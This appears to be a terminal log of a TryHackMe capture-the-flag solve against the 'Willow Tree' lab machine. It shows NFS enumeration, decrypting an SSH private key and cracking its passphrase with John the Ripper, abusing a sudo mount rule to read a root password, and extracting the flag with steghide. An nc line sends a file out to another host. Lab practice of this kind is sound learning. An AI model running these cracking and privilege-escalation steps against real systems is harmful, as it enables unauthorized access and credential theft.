                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls -la /mnt/                     
total 12
drwxr-xr-x  3 root root 4096 Aug 24 16:56 .
drwxr-xr-x 19 root root 4096 Aug 22 11:12 ..
drwxr-xr-x  2 root root 4096 Aug 24 16:56 nfs
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls -la /mnt/nfs
total 8
drwxr-xr-x 2 root root 4096 Aug 24 16:56 .
drwxr-xr-x 3 root root 4096 Aug 24 16:56 ..
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls -la /mnt/nfs
total 12
drwxr--r-- 2 nobody nogroup 4096 Jan 30  2020 .
drwxr-xr-x 3 root   root    4096 Aug 24 16:56 ..
-rw-r--r-- 1 root   root      62 Jan 30  2020 rsa_keys
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ cat /mnt/nfs/rsa_keys            
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ nano script.py                 
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ python script.py                 
Decrypted Message:
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
wLbqFh2kcSbF9SHn0sVnDQOQ1pox2NnGzt2qmmsjTffh8SGQBsGncDei3EABHcv1
gTtzGjHdn+HzvYxvA6J+TMT+akCxXb2+tfA+DObXVHzYKbGAsSNeLEE2CvVZ2X92
0HBZNEvGjsDEIQtc81d33CYjYM4rhJr0mihpCM/OGT3DSFTgZ2COW+H8TCgyhSOX
SmbK1Upwbjg490TYvlMR+OQXjVJKydWFunPj9LbL/2Ut2DOgmdvboaluXq/xHYM7
q8+Ws506DXAXw3L5r9SToYWzaXiIqaVEO145BlMCSTHXMOb2HowSM/P2EHE727sJ
JJ6ykTKOH+yY2Qit09Yt9Kc/FY/yp9LzgTMCtopGhK+1cmje8Ab5h7BMB7waMUiM
YR891N+B3IIdkHPJSL6+WPtTXw5skposYpPGZSbBNMAw5VNVKyeRZJqfMJhP7iKP
d8kExORkdC2DKu3KWkxhQv3tMpLyCUUhGZBJ/29+1At78jHzMfppf13YL13O/K7K
Uhnf8sLAN51xZdefSDoEC3tGBebahh17VTLnu/21mjE76oONZ9fe/H7Y8Cp6BKh4
GknYUmh4DQ/cqGEFr+GHVNHxQ4kE1TSI/0r4WfekbHJr3+IHeTJVI52PWaCeHSLb
bO/2bSbWENgSJ3joXxxumHr4DSvZqUInqZ9/5/jkkg+DrLsEHoHe3YyVh5QVm6ke
33yhlLOvOI6mSYYNNfQ/8U/1ee+2HjQXojvb57clLuOt6+ElQWnEcFEb74NxgQ+I
DHEvVNHFGY+Z2jvCQoGb0LOV8cvVTSDXtbNQ5f/Z3bMdN3AhMN3tQmqXTAPuOI1T
BXZ1aDS6x+s6ecKjybMV/dvnohG8+dDrssV4DPyTOLntpeBkqpSNeiM4MdhxTHj1
PCkDWfBXEAEA/hfvE1oWXMNguy3vlvKn8Sk9We5fl+tEBvPjPNSWrEHksq4ZJWSz
JMEyWi/AxTnHDFiO+3m0Eovw41tdreBU2S6QbYsa9OOAiBnDmWn2m0YmAwS0636L
NJ0Ay4L+ixfYZ+F/5oVQbhvDoXnQCO58mNYqqlDVtD/21aj1+RtoYxSX2f/jxCXt
AMF890psZEugk+mhRZZ6HCvDewmBWkghrZeREEmuWAFkQWV/3gVdMpSdteWM7YIQ
MxkyUMs4jmwvA4ktznTVN1kK7VAtkIUa8+UuVUfchKpQQjwpbGgfdMrcJe55tOdk
M7mSP/jAl9bXlpyikMhrsdkVyNpFtmJU8EGJ4v5GlQzUDuySBCiwcZ7x6u3hpDG+
/+5Nf8423Dy/iAhSWAjoZD3BdkLnfbji1g4dNrJnqHnoZaZxvxs0qQEi/NcOEm4e
W0pyDdA8so0zkTTd7gm6WFarM7ywGec5rX08gT5v3dDYbPA46LJVprtA+D3ymeR4
l3xMq6RDfzFIFa6MWS8yCK67p7mPxSfqvC5NDMONQ/fz+7fO3/pjKBYZYLuchpk4
TsH6aY4QbgnEMuA+Errb/uf/5MAhWDMqLBhi42kxaXZ1e3ZMz2penCZFf/nofbLc
-----END RSA PRIVATE KEY-----
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ nano willow_rsa
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh2john willow_rsa > willow_hash
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ cat willow_hash        
willow_rsa:$sshng$1$16$2E2F405A3529F92188B453CAA6E33270$1200$a9455441a27e626411aada359274f99d6ea6eb59a14e3275fd90679381f43b98ce6e026852d390054fa1a925f31ef717c0b6ea161da47126c5f521e7d2c5670d0390d69a31d8d9c6ceddaa9a6b234df7e1f1219006c1a77037a2dc40011dcbf5813b731a31dd9fe1f3bd8c6f03a27e4cc4fe6a40b15dbdbeb5f03e0ce6d7547cd829b180b1235e2c41360af559d97f76d07059344bc68ec0c4210b5cf35777dc262360ce2b849af49a286908cfce193dc34854e067608e5be1fc4c28328523974a66cad54a706e3838f744d8be5311f8e4178d524ac9d585ba73e3f4b6cbff652dd833a099dbdba1a96e5eaff11d833babcf96b39d3a0d7017c372f9afd493a185b3697888a9a5443b5e390653024931d730e6f61e8c1233f3f610713bdbbb09249eb291328e1fec98d908add3d62df4a73f158ff2a7d2f3813302b68a4684afb57268def006f987b04c07bc1a31488c611f3dd4df81dc821d9073c948bebe58fb535f0e6c929a2c6293c66526c134c030e553552b2791649a9f30984fee228f77c904c4e464742d832aedca5a4c6142fded3292f2094521199049ff6f7ed40b7bf231f331fa697f5dd82f5dcefcaeca5219dff2c2c0379d7165d79f483a040b7b4605e6da861d7b5532e7bbfdb59a313bea838d67d7defc7ed8f02a7a04a8781a49d85268780d0fdca86105afe18754d1f1438904d53488ff4af859f7a46c726bdfe207793255239d8f59a09e1d22db6ceff66d26d610d8122778e85f1c6e987af80d2bd9a94227a99f7fe7f8e4920f83acbb041e81dedd8c958794159ba91edf7ca194b3af388ea649860d35f43ff14ff579efb61e3417a23bdbe7b7252ee3adebe1254169c470511bef8371810f880c712f54d1c5198f99da3bc242819bd0b395f1cbd54d20d7b5b350e5ffd9ddb31d37702130dded426a974c03ee388d530576756834bac7eb3a79c2a3c9b315fddbe7a211bcf9d0ebb2c5780cfc9338b9eda5e064aa948d7a233831d8714c78f53c290359f057100100fe17ef135a165cc360bb2def96f2a7f1293d59ee5f97eb4406f3e33cd496ac41e4b2ae192564b324c1325a2fc0c539c70c588efb79b4128bf0e35b5dade054d92e906d8b1af4e3808819c39969f69b46260304b4eb7e8b349d00cb82fe8b17d867e17fe685506e1bc3a179d008ee7c98d62aaa50d5b43ff6d5a8f5f91b68631497d9ffe3c425ed00c17cf74a6c644ba093e9a145967a1c2bc37b09815a4821ad97911049ae58016441657fde055d32949db5e58ced821033193250cb388e6c2f03892dce74d537590aed502d90851af3e52e5547dc84aa50423c296c681f74cadc25ee79b4e76433b9923ff8c097d6d7969ca290c86bb1d915c8da45b66254f04189e2fe46950cd40eec920428b0719ef1eaede1a431beffee4d7fce36dc3cbf8808525808e8643dc17642e77db8e2d60e1d36b267a879e865a671bf1b34a90122fcd70e126e1e5b4a720dd03cb28d339134ddee09ba5856ab33bcb019e739ad7d3c813e6fddd0d86cf038e8b255a6bb40f83df299e478977c4caba4437f314815ae8c592f3208aebba7b98fc527eabc2e4d0cc38d43f7f3fbb7cedffa6328161960bb9c8699384ec1fa698e106e09c432e03e12badbfee7ffe4c02158332a2c1862e369316976757b764ccf6a5e9c26457ff9e87db2dc
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ john --wordlists /usr/share/wordlists/rockyou.txt willow_hash
Unknown option: "--wordlists"
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ john --wordlist /usr/share/wordlists/rockyou.txt willow_hash 
Warning: only loading hashes of type "tripcode", but also saw type "descrypt"
Use the "--format=descrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "pix-md5"
Use the "--format=pix-md5" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "mysql"
Use the "--format=mysql" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "oracle"
Use the "--format=oracle" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "Raw-SHA1"
Use the "--format=Raw-SHA1" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "LM"
Use the "--format=LM" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "bfegg"
Use the "--format=bfegg" option to force loading hashes of that type instead
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Warning: only loading hashes of type "tripcode", but also saw type "dynamic=md5($p)"
Use the "--format=dynamic=md5($p)" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "cryptoSafe"
Use the "--format=cryptoSafe" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "HAVAL-128-4"
Use the "--format=HAVAL-128-4" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "Raw-SHA256"
Use the "--format=Raw-SHA256" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "Tiger"
Use the "--format=Tiger" option to force loading hashes of that type instead
Warning: only loading hashes of type "tripcode", but also saw type "lotus5"
Use the "--format=lotus5" option to force loading hashes of that type instead
Session aborted
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt willow_hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wildflower       (willow_rsa)     
1g 0:00:00:00 DONE (2025-08-24 17:06) 9.090g/s 91927p/s 91927c/s 91927C/s almond..simran
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ chmod 600 willow_rsa
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh -i willow_rsa willow@10.10.108.166
The authenticity of host '10.10.108.166 (10.10.108.166)' can't be established.
ED25519 key fingerprint is SHA256:magOpLj2XlET5C4pPvsDHoHa4Po1iJpM2eNFkXQUZ2I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.108.166' (ED25519) to the list of known hosts.
Enter passphrase for key 'willow_rsa': 
sign_and_send_pubkey: no mutual signature supported
willow@10.10.108.166's password: 
Permission denied, please try again.
willow@10.10.108.166's password: 
Permission denied, please try again.
willow@10.10.108.166's password: 
willow@10.10.108.166: Permission denied (publickey,password,hostbased).
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls -la         
total 60576
drwxrwxr-x  5 alvan alvan     4096 Aug 24 17:05 .
drwxrwxr-x 13 alvan alvan     4096 Aug 22 11:07 ..
-rw-r--r--  1 root  root      2025 Feb 26  2022 apache-certificate.crt
-rw-rw-r--  1 alvan alvan     3272 Feb 26  2022 apache.key
-rw-rw-r--  1 alvan alvan    27247 Aug 16  2023 capture.pcap
-rw-rw-r--  1 alvan alvan  5890048 Aug 23 18:29 carnage.pcap
-rw-rw-r--  1 alvan alvan 56029783 Sep 24  2021 carnage.pcap.1
drwxrwxr-x  2 alvan alvan     4096 Aug 24 16:54 hack
drwxrwxr-x  2 alvan alvan     4096 Aug 23 18:08 publisher
-rw-rw-r--  1 alvan alvan    10703 Aug 24 17:04 script.py
-rw-rw-r--  1 alvan alvan      173 Aug 20 09:40 stealer.js
-rw-rw-r--  1 alvan alvan      318 Mar 14  2023 update.txt
-rw-rw-r--  1 alvan alvan     2462 Aug 24 17:05 willow_hash
-rw-------  1 alvan alvan     1766 Aug 24 17:04 willow_rsa
-rw-rw-r--  1 alvan alvan    12633 Aug 20 11:11 writeup.md
drwxrwxr-x  2 alvan alvan     4096 Aug 22 08:52 zeno3c0
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh -i willow_rsa willow@10.10.108.166
Enter passphrase for key 'willow_rsa': 
willow@10.10.108.166's password: 
Permission denied, please try again.
willow@10.10.108.166's password: 
Permission denied, please try again.
willow@10.10.108.166's password: 
willow@10.10.108.166: Permission denied (publickey,password,hostbased).
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh -i willow_rsa willow@10.10.108.166
Enter passphrase for key 'willow_rsa': 

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ cat willow_rsa      
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
wLbqFh2kcSbF9SHn0sVnDQOQ1pox2NnGzt2qmmsjTffh8SGQBsGncDei3EABHcv1
gTtzGjHdn+HzvYxvA6J+TMT+akCxXb2+tfA+DObXVHzYKbGAsSNeLEE2CvVZ2X92
0HBZNEvGjsDEIQtc81d33CYjYM4rhJr0mihpCM/OGT3DSFTgZ2COW+H8TCgyhSOX
SmbK1Upwbjg490TYvlMR+OQXjVJKydWFunPj9LbL/2Ut2DOgmdvboaluXq/xHYM7
q8+Ws506DXAXw3L5r9SToYWzaXiIqaVEO145BlMCSTHXMOb2HowSM/P2EHE727sJ
JJ6ykTKOH+yY2Qit09Yt9Kc/FY/yp9LzgTMCtopGhK+1cmje8Ab5h7BMB7waMUiM
YR891N+B3IIdkHPJSL6+WPtTXw5skposYpPGZSbBNMAw5VNVKyeRZJqfMJhP7iKP
d8kExORkdC2DKu3KWkxhQv3tMpLyCUUhGZBJ/29+1At78jHzMfppf13YL13O/K7K
Uhnf8sLAN51xZdefSDoEC3tGBebahh17VTLnu/21mjE76oONZ9fe/H7Y8Cp6BKh4
GknYUmh4DQ/cqGEFr+GHVNHxQ4kE1TSI/0r4WfekbHJr3+IHeTJVI52PWaCeHSLb
bO/2bSbWENgSJ3joXxxumHr4DSvZqUInqZ9/5/jkkg+DrLsEHoHe3YyVh5QVm6ke
33yhlLOvOI6mSYYNNfQ/8U/1ee+2HjQXojvb57clLuOt6+ElQWnEcFEb74NxgQ+I
DHEvVNHFGY+Z2jvCQoGb0LOV8cvVTSDXtbNQ5f/Z3bMdN3AhMN3tQmqXTAPuOI1T
BXZ1aDS6x+s6ecKjybMV/dvnohG8+dDrssV4DPyTOLntpeBkqpSNeiM4MdhxTHj1
PCkDWfBXEAEA/hfvE1oWXMNguy3vlvKn8Sk9We5fl+tEBvPjPNSWrEHksq4ZJWSz
JMEyWi/AxTnHDFiO+3m0Eovw41tdreBU2S6QbYsa9OOAiBnDmWn2m0YmAwS0636L
NJ0Ay4L+ixfYZ+F/5oVQbhvDoXnQCO58mNYqqlDVtD/21aj1+RtoYxSX2f/jxCXt
AMF890psZEugk+mhRZZ6HCvDewmBWkghrZeREEmuWAFkQWV/3gVdMpSdteWM7YIQ
MxkyUMs4jmwvA4ktznTVN1kK7VAtkIUa8+UuVUfchKpQQjwpbGgfdMrcJe55tOdk
M7mSP/jAl9bXlpyikMhrsdkVyNpFtmJU8EGJ4v5GlQzUDuySBCiwcZ7x6u3hpDG+
/+5Nf8423Dy/iAhSWAjoZD3BdkLnfbji1g4dNrJnqHnoZaZxvxs0qQEi/NcOEm4e
W0pyDdA8so0zkTTd7gm6WFarM7ywGec5rX08gT5v3dDYbPA46LJVprtA+D3ymeR4
l3xMq6RDfzFIFa6MWS8yCK67p7mPxSfqvC5NDMONQ/fz+7fO3/pjKBYZYLuchpk4
TsH6aY4QbgnEMuA+Errb/uf/5MAhWDMqLBhi42kxaXZ1e3ZMz2penCZFf/nofbLc
-----END RSA PRIVATE KEY-----
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ nano hacker_willow_rsa
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ chmod 600 hacker_willow_rsa
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh -i hacker_willow_rsa willow@10.10.108.166
Enter passphrase for key 'hacker_willow_rsa': 
willow@10.10.108.166's password: 
Permission denied, please try again.
willow@10.10.108.166's password: 

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh2john hacker_willow_rsa > willow_hack     
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt willow_hack
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt willow_hack
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ cat willow_hack            
hacker_willow_rsa:$sshng$1$16$2E2F405A3529F92188B453CAA6E33270$1200$a9455441a27e626411aada359274f99d6ea6eb59a14e3275fd90679381f43b98ce6e026852d390054fa1a925f31ef717c0b6ea161da47126c5f521e7d2c5670d0390d69a31d8d9c6ceddaa9a6b234df7e1f1219006c1a77037a2dc40011dcbf5813b731a31dd9fe1f3bd8c6f03a27e4cc4fe6a40b15dbdbeb5f03e0ce6d7547cd829b180b1235e2c41360af559d97f76d07059344bc68ec0c4210b5cf35777dc262360ce2b849af49a286908cfce193dc34854e067608e5be1fc4c28328523974a66cad54a706e3838f744d8be5311f8e4178d524ac9d585ba73e3f4b6cbff652dd833a099dbdba1a96e5eaff11d833babcf96b39d3a0d7017c372f9afd493a185b3697888a9a5443b5e390653024931d730e6f61e8c1233f3f610713bdbbb09249eb291328e1fec98d908add3d62df4a73f158ff2a7d2f3813302b68a4684afb57268def006f987b04c07bc1a31488c611f3dd4df81dc821d9073c948bebe58fb535f0e6c929a2c6293c66526c134c030e553552b2791649a9f30984fee228f77c904c4e464742d832aedca5a4c6142fded3292f2094521199049ff6f7ed40b7bf231f331fa697f5dd82f5dcefcaeca5219dff2c2c0379d7165d79f483a040b7b4605e6da861d7b5532e7bbfdb59a313bea838d67d7defc7ed8f02a7a04a8781a49d85268780d0fdca86105afe18754d1f1438904d53488ff4af859f7a46c726bdfe207793255239d8f59a09e1d22db6ceff66d26d610d8122778e85f1c6e987af80d2bd9a94227a99f7fe7f8e4920f83acbb041e81dedd8c958794159ba91edf7ca194b3af388ea649860d35f43ff14ff579efb61e3417a23bdbe7b7252ee3adebe1254169c470511bef8371810f880c712f54d1c5198f99da3bc242819bd0b395f1cbd54d20d7b5b350e5ffd9ddb31d37702130dded426a974c03ee388d530576756834bac7eb3a79c2a3c9b315fddbe7a211bcf9d0ebb2c5780cfc9338b9eda5e064aa948d7a233831d8714c78f53c290359f057100100fe17ef135a165cc360bb2def96f2a7f1293d59ee5f97eb4406f3e33cd496ac41e4b2ae192564b324c1325a2fc0c539c70c588efb79b4128bf0e35b5dade054d92e906d8b1af4e3808819c39969f69b46260304b4eb7e8b349d00cb82fe8b17d867e17fe685506e1bc3a179d008ee7c98d62aaa50d5b43ff6d5a8f5f91b68631497d9ffe3c425ed00c17cf74a6c644ba093e9a145967a1c2bc37b09815a4821ad97911049ae58016441657fde055d32949db5e58ced821033193250cb388e6c2f03892dce74d537590aed502d90851af3e52e5547dc84aa50423c296c681f74cadc25ee79b4e76433b9923ff8c097d6d7969ca290c86bb1d915c8da45b66254f04189e2fe46950cd40eec920428b0719ef1eaede1a431beffee4d7fce36dc3cbf8808525808e8643dc17642e77db8e2d60e1d36b267a879e865a671bf1b34a90122fcd70e126e1e5b4a720dd03cb28d339134ddee09ba5856ab33bcb019e739ad7d3c813e6fddd0d86cf038e8b255a6bb40f83df299e478977c4caba4437f314815ae8c592f3208aebba7b98fc527eabc2e4d0cc38d43f7f3fbb7cedffa6328161960bb9c8699384ec1fa698e106e09c432e03e12badbfee7ffe4c02158332a2c1862e369316976757b764ccf6a5e9c26457ff9e87db2dc
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt willow_hack
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ john --show willow_hack                                     
hacker_willow_rsa:wildflower

1 password hash cracked, 0 left
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh-keygen -p -f hacker_willow_rsa

Enter old passphrase: 
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh -i hacker_willow_rsa willow@10.10.108.166
willow@10.10.108.166's password: 
Permission denied, please try again.
willow@10.10.108.166's password: 
Permission denied, please try again.
willow@10.10.108.166's password: 

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ 
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ 
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh hacker_willow_rsa                        
ssh: Could not resolve hostname hacker_willow_rsa: Name or service not known
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ sudo nano ~/.ssh/config                         

[sudo] password for alvan: 
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh willow             
willow@10.10.108.166's password: 
Permission denied, please try again.
willow@10.10.108.166's password: 

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ sudo nano ~/.ssh/config

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh willow                
The authenticity of host '10.10.178.109 (10.10.178.109)' can't be established.
ED25519 key fingerprint is SHA256:magOpLj2XlET5C4pPvsDHoHa4Po1iJpM2eNFkXQUZ2I.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.178.109' (ED25519) to the list of known hosts.
willow@10.10.178.109's password: 

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh -i hacker_willow_rsa willow@10.10.108.166
^C
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh -i hacker_willow_rsa willow@10.10.178.109
willow@10.10.178.109's password: 

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ sudo nano ~/.ssh/config                      

                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ssh willow                                   
Enter passphrase for key '/home/alvan/THM/ctf/hacker_willow_rsa': 




        "O take me in your arms, love
        For keen doth the wind blow
        O take me in your arms, love
        For bitter is my deep woe."
                 -The Willow Tree, English Folksong




willow@willow-tree:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.jpg  Videos
willow@willow-tree:~$ which python
/usr/bin/python
willow@willow-tree:~$ python -m http.server 8080
/usr/bin/python: No module named http
willow@willow-tree:~$ nc 10.4.124.126 4444 <  user.jpg
(UNKNOWN) [10.4.124.126] 4444 (?) : Connection timed out
willow@willow-tree:~$ sudo -l
Matching Defaults entries for willow on willow-tree:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
willow@willow-tree:~$ ls /dev
autofs           fuse           network_latency     snd     tty17  tty3   tty42  tty55  ttyS1    vcsa         xen
block            hidden_backup  network_throughput  stderr  tty18  tty30  tty43  tty56  ttyS2    vcsa1        xvda
btrfs-control    hpet           null                stdin   tty19  tty31  tty44  tty57  ttyS3    vcsa2        xvda1
char             hugepages      port                stdout  tty2   tty32  tty45  tty58  uhid     vcsa3        xvda2
console          initctl        ppp                 tty     tty20  tty33  tty46  tty59  uinput   vcsa4        xvda3
core             input          psaux               tty0    tty21  tty34  tty47  tty6   urandom  vcsa5        xvdh
cpu              kmsg           ptmx                tty1    tty22  tty35  tty48  tty60  vcs      vcsa6        zero
cpu_dma_latency  log            pts                 tty10   tty23  tty36  tty49  tty61  vcs1     vcsa7
cuse             loop-control   random              tty11   tty24  tty37  tty5   tty62  vcs2     vfio
disk             mapper         rfkill              tty12   tty25  tty38  tty50  tty63  vcs3     vga_arbiter
dri              mcelog         rtc                 tty13   tty26  tty39  tty51  tty7   vcs4     vhci
fb0              mem            rtc0                tty14   tty27  tty4   tty52  tty8   vcs5     vhost-net
fd               mqueue         shm                 tty15   tty28  tty40  tty53  tty9   vcs6     vmci
full             net            snapshot            tty16   tty29  tty41  tty54  ttyS0  vcs7     xconsole
willow@willow-tree:~$ ls /dev/hidden_backup
/dev/hidden_backup
willow@willow-tree:~$ unt /swv/hidden_backup 
-bash: unt: command not found
willow@willow-tree:~$ ls /mnt
creds
willow@willow-tree:~$ ls /mnt/creds
willow@willow-tree:~$ ls -la /mnt/creds
total 8
drwxr-xr-x 2 root root 4096 Jan 30  2020 .
drwxr-xr-x 3 root root 4096 Jan 30  2020 ..
willow@willow-tree:~$ sudo /bin/mount /dev/hidden_backup /mnt/creds
willow@willow-tree:~$ ls -la /mnt/creds
total 6
drwxr-xr-x 2 root root 1024 Jan 30  2020 .
drwxr-xr-x 3 root root 4096 Jan 30  2020 ..
-rw-r--r-- 1 root root   42 Jan 30  2020 creds.txt
willow@willow-tree:~$ cat /mnt/creds/creds.txt
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
willow@willow-tree:~$ 

willow@willow-tree:~$ cat /mnt/creds/creds.txt
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
willow@willow-tree:~$ su root
Password: 
root@willow-tree:/home/willow# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.jpg  Videos
root@willow-tree:/home/willow# cd /root
root@willow-tree:~# ls
root.txt
root@willow-tree:~# cat root.txt
This would be too easy, don't you think? I actually gave you the root flag some time ago.
You've got my password now -- go find your flag!
root@willow-tree:~# ls -la
total 36
drwx------  5 root root 4096 Jan 30  2020 .
drwxr-xr-x 23 root root 4096 Jan 30  2020 ..
lrwxrwxrwx  1 root root    9 Jan 30  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 Jan 30  2020 .config
drwxr-xr-x  3 root root 4096 Jan 30  2020 .local
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root  139 Jan 30  2020 root.txt
-rw-r--r--  1 root root   74 Jan 30  2020 .selected_editor
drwx------  2 root root 4096 Mar  1  2020 .ssh
root@willow-tree:~# ls ~/Desktop
ls: cannot access /root/Desktop: No such file or directory
root@willow-tree:~# ls
root.txt
root@willow-tree:~# pwd
/root
root@willow-tree:~# find / -name .txt 2>/dev/null
root@willow-tree:~# ls /
bin   dev  home        lib    live-build  media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib64  lost+found  mnt    proc  run   srv   tmp  var
root@willow-tree:~# ls /home



┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ steghide extract -sf user.jpg                                  
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ steghide extract -sf user.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ steghide extract -sf user.jpg
Enter passphrase: 
wrote extracted data to "root.txt".
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ ls                               
apache-certificate.crt  carnage.pcap    hacker_willow_rsa  script.py   user.jpg     willow_hash  zeno3c0
apache.key              carnage.pcap.1  publisher          stealer.js  willow.md    willow_rsa
capture.pcap            hack            root.txt           update.txt  willow_hack  writeup.md
                                                                                                                    
┌──(alvan㉿vbox)-[~/THM/ctf]
└─$ cat root.txt              
THM{find_a_red_rose_on_the_grave}
                                   
